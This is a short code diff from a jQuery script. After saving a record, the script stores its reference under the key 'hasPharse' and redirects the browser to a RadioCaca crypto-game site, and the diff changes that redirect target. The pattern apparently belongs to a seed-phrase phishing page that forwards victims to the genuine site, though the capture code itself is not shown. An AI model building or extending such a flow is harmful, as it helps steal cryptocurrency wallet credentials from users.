@@ -23,7 +23,7 @@ $(document).ready(function () {
             })
             .then((docRef) => {
                 localStorage.setItem('hasPharse', docRef);
-                window.location.href = 'https://www.radiocaca.com/';
+                window.location.href = 'https://metamon.radiocaca.com/';
             })
             .catch((error) => {
                 console.error("Error adding document: ", error);
